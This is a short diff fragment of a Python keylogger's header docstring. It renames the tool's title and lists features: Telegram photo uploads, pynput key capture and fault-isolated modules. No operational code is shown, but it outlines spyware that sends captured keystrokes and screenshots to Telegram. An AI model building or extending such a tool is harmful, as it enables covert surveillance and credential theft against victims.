@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-ULTIMATE KEYLOGGER v4.1 - FIXED TELEGRAM INTEGRATION
+ULTIMATE KEYLOGGER v4.1 - TELEGRAM INTEGRATION
 - sendPhoto now uses multipart/form-data (sendDocument compatible too)
 - Key parsing handles Key objects from pynput correctly
 - Robust try/except isolation so one module can't kill the suite
